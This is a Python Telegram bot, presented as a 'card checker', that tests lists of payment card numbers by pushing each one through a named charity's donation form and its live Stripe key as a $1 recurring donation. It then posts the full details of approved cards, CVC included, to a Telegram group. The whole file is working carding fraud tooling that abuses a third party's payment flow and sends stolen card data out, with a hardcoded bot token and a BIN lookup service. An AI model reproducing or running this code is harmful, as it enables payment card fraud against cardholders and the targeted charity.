#!/usr/bin/env python3
"""
Mady Bot - Card Checker Telegram Bot
Uses the original mady.py gate logic ($1 charge)
Posts results to Telegram group
"""

import requests
import re
import time
import os
import telebot
from telebot import types
import traceback

# Bot Configuration
BOT_TOKEN = "7984658748:AAF1QfpAPVg9ncXkA4NKRohqxNfBZ8Pet1s"
GROUP_ID = "-1003538559040"
BOT_CREDIT = "@MissNullMe"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# Allowed users (empty means anyone can use)
allowed_users = []

def check_card_mady_gate(cc_combo):
    """
    Original Mady gate logic - $1 charge
    Returns: (status, message, raw_response)
    """
    try:
        parts = cc_combo.strip().split('|')
        if len(parts) != 4:
            return ("error", "Invalid format", "")
        
        n, mm, yy, cvc = parts
        
        if not all([n.isdigit(), mm.isdigit(), yy.isdigit(), cvc.isdigit()]):
            return ("error", "All parts must be numeric", "")
        
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
        elif len(yy) != 2:
            return ("error", f"Invalid year: {yy}", "")
        
        mm = mm.zfill(2)
        
        print(f"[Mady] Checking: {n[:6]}******{n[-4:]}")
        
        # Step 1: Create Stripe Payment Method
        headers_pm = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        data_pm = f'type=card&billing_details[name]=Dievn&billing_details[email]=haowxjds%40gmail.com&billing_details[address][line1]=Kaode5+City&billing_details[address][postal_code]=10080&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=87e42ba5-9910-462d-8b5e-69ea049036fad3667d&muid=e3385f96-ab50-440b-b4fc-62efc795e561fa4880&sid=7163a14d-1ac8-40fe-a426-b5b031f5611f263c50&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fccfoundationorg.com&time_on_page=88364&key=pk_live_51IGkkVAgdYEhlUBFnXi5eN0WC8T5q7yyDOjZfj3wGc93b2MAxq0RvWwOdBdGIl7enL3Lbx27n74TTqElkVqk5fhE00rUuIY5Lp'
        
        response_pm = requests.post('https://api.stripe.com/v1/payment_methods', 
                                   headers=headers_pm, data=data_pm, timeout=20)
        
        if response_pm.status_code != 200:
            return ("error", f"PM Failed: HTTP {response_pm.status_code}", "")
        
        pm_json = response_pm.json()
        pm_id = pm_json.get('id')
        
        if not pm_id:
            error_msg = pm_json.get('error', {}).get('message', 'Unknown error')
            return ("declined", error_msg, "")
        
        print(f"[Mady] PM: {pm_id}")
        
        # Step 2: Process Donation
        headers_donate = {
            'authority': 'ccfoundationorg.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://ccfoundationorg.com',
            'referer': 'https://ccfoundationorg.com/donate/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data_donate = {
            'charitable_form_id': '69433fc4b65ac',
            '_charitable_donation_nonce': '49c3e28b2a',
            '_wp_http_referer': '/donate/',
            'campaign_id': '988003',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'recurring_donation': 'month',
            'first_name': 'bodu',
            'last_name': 'Diven',
            'email': 'haowxjds@gmail.com',
            'address': 'Kaode5 City',
            'postcode': '10080',
            'gateway': 'stripe',
            'stripe_payment_method': pm_id,
            'action': 'make_donation',
        }
        
        response_donate = requests.post('https://ccfoundationorg.com/wp-admin/admin-ajax.php',
                                       headers=headers_donate, data=data_donate, timeout=30)
        
        msg = response_donate.text
        
        if 'requires_action' in msg or 'successed' in msg or 'Thank you' in msg:
            return ("approved", "Approved ✅", msg[:200])
        else:
            return ("declined", "Declined ❌", msg[:200])
            
    except requests.exceptions.Timeout:
        return ("error", "Timeout", "")
    except Exception as e:
        return ("error", f"Error: {str(e)[:50]}", "")


def get_bin_info(bin_num):
    """Get BIN information"""
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_num}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'brand': data.get('brand', 'N/A').upper(),
                'type': data.get('type', 'N/A').upper(),
                'bank': data.get('bank', 'N/A'),
                'country': data.get('country_name', 'N/A'),
                'flag': data.get('country_flag', '🏳️')
            }
    except:
        pass
    return {'brand': 'N/A', 'type': 'N/A', 'bank': 'N/A', 'country': 'N/A', 'flag': '🏳️'}


@bot.message_handler(commands=['start'])
def start_command(message):
    """Start command"""
    welcome_msg = f"""
👋 <b>Welcome to Mady Bot!</b>

🤖 <b>Card Checker Bot</b>
💳 <b>Gate:</b> $1.00 USD Charge
🎯 <b>Target:</b> CC Foundation

<b>📋 How to Use:</b>

<b>1. Single Card:</b>
Send: <code>CC|MM|YY|CVC</code>

<b>2. Check File Path:</b>
<code>/check /path/to/file.txt</code>
Example: <code>/check /home/null/Desktop/TestCards.txt</code>

<b>3. Upload File:</b>
Upload .txt file directly

<b>⚡ Features:</b>
✅ Approved → Posted to group
❌ Declined → Shown in chat
🔍 BIN info included
⏱️ Rate limit: 2.5s/card
🛑 /stop to halt processing

<b>Bot by:</b> {BOT_CREDIT}
"""
    bot.reply_to(message, welcome_msg)


@bot.message_handler(commands=['stop'])
def stop_command(message):
    """Stop file processing"""
    user_id = str(message.from_user.id)
    stop_file = f"{user_id}.stop"
    
    try:
        with open(stop_file, 'w') as f:
            f.write('stop')
        bot.reply_to(message, "🛑 <b>Stop signal sent!</b>")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")


@bot.message_handler(commands=['check'])
def check_file_path(message):
    """Check cards from a specific file path"""
    user_id = str(message.from_user.id)
    
    try:
        # Get file path from command
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ <b>Usage:</b>\n\n<code>/check /path/to/file.txt</code>\n\nExample:\n<code>/check /home/null/Desktop/TestCards.txt</code>")
            return
        
        file_path = parts[1].strip()
        
        # Check if file exists
        if not os.path.exists(file_path):
            bot.reply_to(message, f"❌ <b>File not found:</b>\n\n<code>{file_path}</code>")
            return
        
        # Check if it's a file
        if not os.path.isfile(file_path):
            bot.reply_to(message, f"❌ <b>Not a file:</b>\n\n<code>{file_path}</code>")
            return
        
        # Read cards from file
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        
        cards = [line.strip() for line in lines if line.strip() and re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', line.strip())]
        
        if not cards:
            bot.reply_to(message, f"⚠️ <b>No valid cards found in:</b>\n\n<code>{file_path}</code>")
            return
        
        total = len(cards)
        bot.reply_to(message, f"📁 <b>File:</b> <code>{os.path.basename(file_path)}</code>\n✅ <b>Valid cards:</b> {total}\n\n⏳ Starting check...")
        
        # Process cards
        approved = 0
        declined = 0
        errors = 0
        stop_file = f"{user_id}.stop"
        
        if os.path.exists(stop_file):
            os.remove(stop_file)
        
        status_msg = bot.send_message(message.chat.id, f"⏳ Processing 0/{total}")
        
        for idx, card in enumerate(cards, 1):
            if os.path.exists(stop_file):
                bot.edit_message_text(f"🛑 Stopped at {idx-1}/{total}", 
                                    chat_id=message.chat.id, message_id=status_msg.message_id)
                os.remove(stop_file)
                break
            
            bin_num = card.split('|')[0][:6]
            bin_info = get_bin_info(bin_num)
            
            start_time = time.time()
            status, result_msg, raw_response = check_card_mady_gate(card)
            elapsed = time.time() - start_time
            
            if status == "approved":
                approved += 1
                try:
                    group_msg = f"""
✅✅ <b>APPROVED CARD</b> ✅✅

<b>Card:</b> <code>{card}</code>
<b>Gateway:</b> Mady Gate ($1 USD)
<b>Response:</b> {result_msg} 🟢

<b>BIN:</b> {bin_num} | {bin_info['brand']} {bin_info['type']}
<b>Bank:</b> {bin_info['bank']}
<b>Country:</b> {bin_info['country']} {bin_info['flag']}

<b>By:</b> {message.from_user.first_name}
<b>Bot:</b> {BOT_CREDIT}
"""
                    bot.send_message(GROUP_ID, group_msg)
                    print(f"[Group] Posted: {card[:6]}******{card[-4:]}")
                except Exception as e:
                    print(f"[Group] Error: {e}")
            elif status == "declined":
                declined += 1
            else:
                errors += 1
            
            if idx % 10 == 0 or idx == total:
                try:
                    progress_text = f"""
⏳ <b>Processing...</b>

📊 {idx}/{total}
✅ Approved: {approved}
❌ Declined: {declined}
⚠️ Errors: {errors}

<b>Current:</b> {card[:6]}******{card[-4:]}
<b>Time:</b> {elapsed:.2f}s

/stop to halt
"""
                    bot.edit_message_text(progress_text, chat_id=message.chat.id, 
                                        message_id=status_msg.message_id)
                except:
                    pass
            
            if idx < total:
                time.sleep(2.5)
        
        final_text = f"""
🎉 <b>Complete!</b>

📁 <b>File:</b> {os.path.basename(file_path)}
📊 <b>Results:</b>
✅ Approved: {approved}
❌ Declined: {declined}
⚠️ Errors: {errors}
📁 Total: {total}

<b>Bot by:</b> {BOT_CREDIT}
"""
        bot.edit_message_text(final_text, chat_id=message.chat.id, 
                            message_id=status_msg.message_id)
        
        if os.path.exists(stop_file):
            os.remove(stop_file)
            
    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error:</b> {e}")
        print(f"[Check] Error: {e}")
        traceback.print_exc()


@bot.message_handler(func=lambda message: message.text and '|' in message.text and not message.text.startswith('/'))
def check_single_card(message):
    """Check a single card"""
    cc_combo = message.text.strip()
    
    if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc_combo):
        bot.reply_to(message, "⚠️ <b>Invalid Format!</b>\n\nUse: <code>CC|MM|YY|CVC</code>")
        return
    
    processing_msg = bot.reply_to(message, f"⏳ <b>Checking...</b>\n\n<code>{cc_combo[:6]}******{cc_combo[-4:]}</code>")
    
    bin_num = cc_combo.split('|')[0][:6]
    bin_info = get_bin_info(bin_num)
    
    start_time = time.time()
    status, result_msg, raw_response = check_card_mady_gate(cc_combo)
    elapsed = time.time() - start_time
    
    if status == "approved":
        status_icon = "✅"
        status_text = "APPROVED ✅✅"
        color = "🟢"
    elif status == "declined":
        status_icon = "❌"
        status_text = "DECLINED"
        color = "🔴"
    else:
        status_icon = "⚠️"
        status_text = "ERROR"
        color = "🟡"
    
    response_text = f"""
{status_icon} <b>{status_text}</b>

<b>Card:</b> <code>{cc_combo}</code>
<b>Gateway:</b> Mady Gate ($1 USD)
<b>Response:</b> {result_msg} {color}

<b>BIN:</b> {bin_num}
<b>Info:</b> {bin_info['brand']} {bin_info['type']}
<b>Bank:</b> {bin_info['bank']}
<b>Country:</b> {bin_info['country']} {bin_info['flag']}

<b>Time:</b> {elapsed:.2f}s
<b>By:</b> {message.from_user.first_name}
<b>Bot:</b> {BOT_CREDIT}
"""
    
    try:
        bot.edit_message_text(response_text, chat_id=message.chat.id, 
                            message_id=processing_msg.message_id)
    except:
        bot.send_message(message.chat.id, response_text)
    
    if status == "approved":
        try:
            group_msg = f"""
✅✅ <b>APPROVED CARD</b> ✅✅

<b>Card:</b> <code>{cc_combo}</code>
<b>Gateway:</b> Mady Gate ($1 USD)
<b>Response:</b> {result_msg} 🟢

<b>BIN:</b> {bin_num} | {bin_info['brand']} {bin_info['type']}
<b>Bank:</b> {bin_info['bank']}
<b>Country:</b> {bin_info['country']} {bin_info['flag']}

<b>By:</b> {message.from_user.first_name}
<b>Bot:</b> {BOT_CREDIT}
"""
            bot.send_message(GROUP_ID, group_msg)
            print(f"[Group] Posted: {cc_combo[:6]}******{cc_combo[-4:]}")
        except Exception as e:
            print(f"[Group] Error: {e}")


@bot.message_handler(content_types=['document'])
def handle_file(message):
    """Handle file upload"""
    user_id = str(message.from_user.id)
    
    if not message.document.file_name.lower().endswith('.txt'):
        bot.reply_to(message, "⚠️ Send .txt file only!")
        return
    
    if message.document.file_size > 1024 * 1024:
        bot.reply_to(message, "⚠️ File too large! Max 1MB")
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        temp_file = f"temp_{user_id}_{message.message_id}.txt"
        with open(temp_file, 'wb') as f:
            f.write(downloaded_file)
        
        with open(temp_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        
        cards = [line.strip() for line in lines if line.strip() and re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', line.strip())]
        
        if not cards:
            bot.reply_to(message, "⚠️ No valid cards found!")
            os.remove(temp_file)
            return
        
        total = len(cards)
        bot.reply_to(message, f"📁 <b>Loaded {total} cards</b>\n\n⏳ Starting...")
        
        approved = 0
        declined = 0
        errors = 0
        stop_file = f"{user_id}.stop"
        
        if os.path.exists(stop_file):
            os.remove(stop_file)
        
        status_msg = bot.send_message(message.chat.id, f"⏳ Processing 0/{total}")
        
        for idx, card in enumerate(cards, 1):
            if os.path.exists(stop_file):
                bot.edit_message_text(f"🛑 Stopped at {idx-1}/{total}", 
                                    chat_id=message.chat.id, message_id=status_msg.message_id)
                os.remove(stop_file)
                break
            
            bin_num = card.split('|')[0][:6]
            bin_info = get_bin_info(bin_num)
            
            start_time = time.time()
            status, result_msg, raw_response = check_card_mady_gate(card)
            elapsed = time.time() - start_time
            
            if status == "approved":
                approved += 1
                try:
                    group_msg = f"""
✅✅ <b>APPROVED CARD</b> ✅✅

<b>Card:</b> <code>{card}</code>
<b>Gateway:</b> Mady Gate ($1 USD)
<b>Response:</b> {result_msg} 🟢

<b>BIN:</b> {bin_num} | {bin_info['brand']} {bin_info['type']}
<b>Bank:</b> {bin_info['bank']}
<b>Country:</b> {bin_info['country']} {bin_info['flag']}

<b>By:</b> {message.from_user.first_name}
<b>Bot:</b> {BOT_CREDIT}
"""
                    bot.send_message(GROUP_ID, group_msg)
                    print(f"[Group] Posted: {card[:6]}******{card[-4:]}")
                except Exception as e:
                    print(f"[Group] Error: {e}")
            elif status == "declined":
                declined += 1
            else:
                errors += 1
            
            if idx % 10 == 0 or idx == total:
                try:
                    progress_text = f"""
⏳ <b>Processing...</b>

📊 {idx}/{total}
✅ Approved: {approved}
❌ Declined: {declined}
⚠️ Errors: {errors}

<b>Current:</b> {card[:6]}******{card[-4:]}
<b>Time:</b> {elapsed:.2f}s

/stop to halt
"""
                    bot.edit_message_text(progress_text, chat_id=message.chat.id, 
                                        message_id=status_msg.message_id)
                except:
                    pass
            
            if idx < total:
                time.sleep(2.5)
        
        final_text = f"""
🎉 <b>Complete!</b>

📊 <b>Results:</b>
✅ Approved: {approved}
❌ Declined: {declined}
⚠️ Errors: {errors}
📁 Total: {total}

<b>Bot by:</b> {BOT_CREDIT}
"""
        bot.edit_message_text(final_text, chat_id=message.chat.id, 
                            message_id=status_msg.message_id)
        
        os.remove(temp_file)
        if os.path.exists(stop_file):
            os.remove(stop_file)
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")
        print(f"[File] Error: {e}")
        traceback.print_exc()


if __name__ == "__main__":
    print("=" * 50)
    print("Mady Bot Starting...")
    print(f"Bot Credit: {BOT_CREDIT}")
    print(f"Group ID: {GROUP_ID}")
    print("=" * 50)
    
    while True:
        try:
            bot.infinity_polling(timeout=20, long_polling_timeout=10)
        except Exception as e:
            print(f"[Polling] Error: {e}")
            time.sleep(5)
